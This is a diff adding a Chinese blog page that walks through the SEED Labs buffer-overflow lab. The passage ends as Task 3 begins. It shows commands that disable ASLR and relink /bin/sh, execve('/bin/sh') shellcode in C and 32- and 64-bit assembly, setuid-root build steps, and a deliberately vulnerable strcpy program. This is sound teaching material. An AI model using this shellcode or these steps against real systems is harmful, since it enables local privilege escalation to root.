@@ -1,0 +1,1093 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="环境设置关闭反制措施现代操作系统已经实现了几种安全机制使得缓冲区溢出攻击变得困难。为了简化攻击，我们首先需要 关闭它们。之后我们会启用这些防御机制并观察攻击是否还能成功。 地址空间布局随机化：猜测地址是缓冲区溢出攻击的关键步骤之一。Ubuntu与其它几个基于Linux的操 作系统使用地址空间随机化使堆和栈的起始地址随机化，使得攻击者很难猜测出确切的地址。 使用命令sudo sysctl -w ke">
+<meta property="og:type" content="article">
+<meta property="og:title" content="软件安全实验 SEEDlabs 缓冲区溢出漏洞实验">
+<meta property="og:url" content="http://example.com/2026/test36/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="环境设置关闭反制措施现代操作系统已经实现了几种安全机制使得缓冲区溢出攻击变得困难。为了简化攻击，我们首先需要 关闭它们。之后我们会启用这些防御机制并观察攻击是否还能成功。 地址空间布局随机化：猜测地址是缓冲区溢出攻击的关键步骤之一。Ubuntu与其它几个基于Linux的操 作系统使用地址空间随机化使堆和栈的起始地址随机化，使得攻击者很难猜测出确切的地址。 使用命令sudo sysctl -w ke">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151763.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151466.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151188.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151596.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151482.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151155.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152716.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152923.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152523.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152060.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152315.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152173.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152609.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152695.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152696.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152931.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152769.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152023.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152407.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152511.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152992.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152531.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152786.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152793.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152065.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152152418.png">
+<meta property="article:published_time" content="2026-04-15T10:30:57.102Z">
+<meta property="article:modified_time" content="2026-04-15T13:53:02.916Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="SEEDlabs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151763.png">
+  
+  
+  
+  <title>软件安全实验 SEEDlabs 缓冲区溢出漏洞实验 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="软件安全实验 SEEDlabs 缓冲区溢出漏洞实验"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:30" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">软件安全实验 SEEDlabs 缓冲区溢出漏洞实验</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><h3 id="关闭反制措施"><a href="#关闭反制措施" class="headerlink" title="关闭反制措施"></a>关闭反制措施</h3><p>现代操作系统已经实现了几种安全机制使得缓冲区溢出攻击变得困难。为了简化攻击，我们首先需要 关闭它们。之后我们会启用这些防御机制并观察攻击是否还能成功。</p>
+<p><strong>地址空间布局随机化</strong>：猜测地址是缓冲区溢出攻击的关键步骤之一。Ubuntu与其它几个基于Linux的操 作系统使用地址空间随机化使堆和栈的起始地址随机化，使得攻击者很难猜测出确切的地址。</p>
+<p>使用命令<code>sudo sysctl -w kernel.randomize_va_space=0</code>来关闭地址空间布局随机化。</p>
+<p><strong>配置&#x2F;bin&#x2F;sh</strong></p>
+<blockquote>
+<p><strong>zsh（Z shell）</strong> 是一种功能丰富的 Unix shell，既可以交互式使用，也可以做脚本解释器。</p>
+<p>以下是常见的 Unix&#x2F;Linux shell：</p>
+<ol>
+<li><strong>sh</strong>：最早的 Bourne Shell，标准 shell，脚本兼容性好。</li>
+<li><strong>bash</strong>：Bourne Again Shell，最流行的 shell，现代 Linux 的默认 shell，功能丰富，脚本能力强。</li>
+<li><strong>zsh</strong>：功能强大，支持高级补全和定制，流行于开发者和 power user。</li>
+<li><strong>ksh</strong>：Korn Shell，兼容 sh，脚本和交互都很强，部分企业系统用得多。</li>
+<li><strong>csh</strong>：C Shell，语法风格像 C 语言，历史较久，但现在用得少。</li>
+<li><strong>tcsh</strong>：C Shell 的增强版，增加了命令行编辑和补全。</li>
+<li><strong>fish</strong>：Friendly Interactive Shell，主打用户友好和易用，语法更简洁，自动提示很强。</li>
+<li><strong>Dash</strong>：Debian Almquist Shell，专为脚本执行优化，速度快，常用于 Ubuntu 的 &#x2F;bin&#x2F;sh。</li>
+</ol>
+</blockquote>
+<p>在最新版的Ubuntu操作系统中，&#x2F;bin&#x2F;sh符号链接指向&#x2F;bin&#x2F;dashshell。dash 程序和 bash 程序都实现了一种安全机制，可以防止自身在 Set-UID进程中执行。简单来说，如果检测到它们在 Set-UID 进程中执行，它们会立即将有效userID切换为进程的真实userID，放弃特权。</p>
+<p>因为我们的被攻击程序是一个 Set-UID程序，并且我们的攻击依赖于运行&#x2F;bin&#x2F;sh，所以&#x2F;bin&#x2F;dash 的安全机制使我们的攻击变得更加困难。因此，我们将&#x2F;bin&#x2F;sh链接到另一个没有这种安全机制的shell 上（在之后的任务中，我们将证明，只要稍加努力，&#x2F;bin&#x2F;dash的安全机制很容易攻破）。我们已经在 Ubuntu 20.04 VM 中安装了一个名为 zsh的shell程序，以下命令可以将&#x2F;bin&#x2F;sh链接到 zsh：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">ln</span> -sf /bin/zsh /bin/sh<br></code></pre></td></tr></table></figure>
+
+<p><strong>StackGuard 与不可执行栈</strong> 这是操作系统中另外的两个安全机制。它们可以在编译过程中被关闭，之后 我们会在编译漏洞程序时讨论它们。</p>
+<h2 id="Task1：熟悉shellcode"><a href="#Task1：熟悉shellcode" class="headerlink" title="Task1：熟悉shellcode"></a>Task1：熟悉shellcode</h2><p>缓冲区溢出攻击的终极目的是将恶意代码注入到目标程序中，这样就可以使用目标程序的特权来执行 这些恶意代码。Shellcode被广泛运用于代码注入攻击中。在本任务中先熟悉一下它。</p>
+<blockquote>
+<p>为什么叫 shellcode？</p>
+<p>“shell”指的是命令行终端，“code”指的是代码——所以 shellcode 就是“能让程序打开命令行窗口的代码”。</p>
+<p>主要作用：</p>
+<p>最常见的用途是让目标程序打开一个 shell（命令行窗口），攻击者可以通过这个 shell 输入任意命令，进一步控制系统；也可以用来执行其他任意操作，比如下载文件、提权、修改数据等。</p>
+</blockquote>
+<h3 id="C语言版本的shellcode"><a href="#C语言版本的shellcode" class="headerlink" title="C语言版本的shellcode"></a>C语言版本的shellcode</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-type">char</span> *name[<span class="hljs-number">2</span>];<br>  name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>  name[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>  execve(name[<span class="hljs-number">0</span>], name, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>编译并设置所有者为root：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc cshellcode.c -o cshellcode<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> root cshellcode<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> 4755 cshellcode<br>./cshellcode<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151763.png" srcset="/img/loading.gif" lazyload alt="image-20251005195511761"></p>
+<p>发现成功进入了root shell。</p>
+<h3 id="32bit-shellcode"><a href="#32bit-shellcode" class="headerlink" title="32bit shellcode"></a>32bit shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; Store the command on stack<br>xor eax, eax<br>push eax<br>push &quot;//sh&quot;<br>push &quot;/bin&quot;<br>mov ebx, esp ; ebx --&gt; &quot;/bin//sh&quot;: execve()&#x27;s 1st argument<br><br>; Construct the argument array argv[]<br>push eax ; argv[1] = 0<br>push ebx ; argv[0] --&gt; &quot;/bin//sh&quot;<br>mov ecx, esp ; ecx --&gt; argv[]: execve()&#x27;s 2nd argument<br><br>; For environment variable<br>xor edx, edx ; edx = 0: execve()&#x27;s 3rd argument<br><br>; Invoke execve()<br>xor eax, eax ;<br>mov al, 0x0b ; execve()&#x27;s system call number<br>int 0x80<br></code></pre></td></tr></table></figure>
+
+<p>上述shellcode通过调用execve()系统调用来执行&#x2F;bin&#x2F;sh。在单独的SEED实验ShellcodeLab中， 我们会指导学生从头编写shellcode。在这里，我们仅给出一个简单的解释。</p>
+<ul>
+<li><p>第三条指令将”&#x2F;&#x2F;sh”而不是”&#x2F;sh”压入栈中。这是因为在这儿我们需要一个32-bit的数，而”&#x2F;sh” 仅有24bits。幸运的是，”&#x2F;&#x2F;“和”&#x2F;“等价，所以我们可以使用”&#x2F;&#x2F;sh”来代替”&#x2F;sh”。</p>
+</li>
+<li><p>我们需要通过ebx,ecx以及edx这三个寄存器向execve()传递三个参数。大多数的shellcode都 是为这三个参数构造内容。</p>
+</li>
+<li><p>当我们将寄存器al的值设置为0x0b，并且执行”int0x80”时，就会调用execve()系统调用。</p>
+</li>
+</ul>
+<h3 id="64bit-shellcode"><a href="#64bit-shellcode" class="headerlink" title="64bit shellcode"></a>64bit shellcode</h3><p>在下面我们提供了一个64-bit的shellcode。它与32-bit的shellcode非常类似，只是寄存器的名称 以及execve()系统调用使用的寄存器不同。同时我们在注释部分给出了代码的部分解释但是不会提供 shellcode的详细说明。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor rdx, rdx ; rdx = 0: execve()&#x27;s 3rd argument<br>push rdx<br>mov rax, &#x27;/bin//sh&#x27; ; the command we want to run<br>push rax ;<br>mov rdi, rsp ; rdi --&gt; &quot;/bin//sh&quot;: execve()&#x27;s 1st argument<br>push rdx ; argv[1] = 0<br>push rdi ; argv[0] --&gt; &quot;/bin//sh&quot;<br>mov rsi, rsp ; rsi --&gt; argv[]: execve()&#x27;s 2nd argument<br>xor rax, rax<br>mov al, 0x3b ; execve()&#x27;s system call number<br>syscall<br></code></pre></td></tr></table></figure>
+
+<h3 id="调用shellcode"><a href="#调用shellcode" class="headerlink" title="调用shellcode"></a>调用shellcode</h3><p>在shellcode文件夹中，已经帮我们写好了Makefile文件，如下所示：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">all: </span><br>	gcc -m32 -z execstack -o a32.out call_shellcode.c<br>	gcc -z execstack -o a64.out call_shellcode.c<br><br><span class="hljs-section">setuid:</span><br>	gcc -m32 -z execstack -o a32.out call_shellcode.c<br>	gcc -z execstack -o a64.out call_shellcode.c<br>	sudo chown root a32.out a64.out<br>	sudo chmod 4755 a32.out a64.out<br><br><span class="hljs-section">clean:</span><br>	rm -f a32.out a64.out *.o<br></code></pre></td></tr></table></figure>
+
+<p>使用命令<code>make all</code>，会编译c源代码，生成<code>a32.out</code>和<code>a64.out</code>，执行发现会进入seed权限的shell</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151466.png" srcset="/img/loading.gif" lazyload alt="image-20251005200446594"></p>
+<p>使用命令<code>make setuid</code>，会编译c源代码，并将两个可执行文件设置为setuid文件，执行后发现进入root权限的shell</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152151188.png" srcset="/img/loading.gif" lazyload alt="image-20251005200620592"></p>
+<h2 id="Task2：理解漏洞程序"><a href="#Task2：理解漏洞程序" class="headerlink" title="Task2：理解漏洞程序"></a>Task2：理解漏洞程序</h2><h3 id="源码解释"><a href="#源码解释" class="headerlink" title="源码解释"></a>源码解释</h3><p>在本实验中使用的漏洞程序为code文件夹中的stack.c程序。此程序有一个缓冲区溢出漏洞，你 的工作是利用此漏洞并获得root权限。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUF_SIZE 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dummy_function</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">bof</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[BUF_SIZE];<br><br>    <span class="hljs-comment">// The following statement has a buffer overflow problem </span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);       <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>    badfile = fopen(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <br>    <span class="hljs-keyword">if</span> (!badfile) &#123;<br>       perror(<span class="hljs-string">&quot;Opening badfile&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-type">int</span> length = fread(str, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">517</span>, badfile);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input size: %d\n&quot;</span>, length);<br>    dummy_function(str);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;==== Returned Properly ====\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// This function is used to insert a stack frame of size </span><br><span class="hljs-comment">// 1000 (approximately) between main&#x27;s and bof&#x27;s stack frames. </span><br><span class="hljs-comment">// The function itself does not do anything. </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">dummy_function</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span><br>&#123;<br>    <span class="hljs-type">char</span> dummy_buffer[<span class="hljs-number">1000</span>];<br>    <span class="hljs-built_in">memset</span>(dummy_buffer, <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>);<br>    bof(str);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>上述程序存在缓冲区溢出漏洞。它首先从 badfile文件中读取一个输入，然后将该输入传递给 函数 bof()中的另一个缓冲区。原始输入的最大长度可以为 517字节，但是 bof()中的缓冲区只有 BUF_SIZE(100) 字节长，小于 517字节。因为函数 strcpy()不检查边界，所以会发生缓冲区溢出。由于 此程序是一个以 root为所有者的 Set-UID程序，如果普通用户可以利用该缓冲区溢出漏洞，普通用户 可能会获得 root shell。需要注意的是，该程序从 badfile文件中获取输入，这个文件受用户控制。现 在我们的目标是为 badfile文件创建内容，这样当漏洞程序将内容复制到其缓冲区时，就可以获得 root shell。</p>
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>要编译上述的漏洞程序，请不要忘记使用”-fno-stack-protector”和”-z execstack”选项关闭 StackGuard 和不可执行栈的保护机制。编译之后，我们需要将可执行文件 stack设置为一个以 root为 所有者的 Set-UID程序。要完成这一点，首先将程序的所有者更改为 root(Line1)，然后将权限更改为 4755 来设置 Set-UID位(Line2)。需要注意的是，必须在设置 Set-UID位之前更改程序的所有者，因为 所有者更改将会导致 Set-UID位被关闭。 </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$ gcc-DBUF_SIZE=<span class="hljs-number">100</span>-m32-o stack-z execstack-fno-stack-protector stack.c <br>$ sudo chown root stack <span class="hljs-comment">// Line 1 </span><br>$ sudo chmod <span class="hljs-number">4755</span> stack <span class="hljs-comment">// Line 2</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>注意</strong>：这些已经写到Makefile中了，只需<code>make</code>即可。</p>
+<h2 id="Task3：对-32-bit-程序实施攻击-Level-1"><a href="#Task3：对-32-bit-程序实施攻击-Level-1" class="headerlink" title="Task3：对 32-bit 程序实施攻击 (Level 1)"></a>Task3：对 32-bit 程序实施攻击 (Level 1)</h2><h3 id="研究探索"><a href="#研究探索" class="headerlink" title="研究探索"></a>研究探索</h3><p>要利用目标程序中的缓冲区溢出漏洞，最重要的是需要知道缓冲区的起始位置与存储返回地址的位置 之间的距离。我们将使用调试的方法来获取这个距离。因为我们有目标程序的源代码，所以我们可以在编 译目标程序时使用调试选项，使它更方便进行调试。</p>
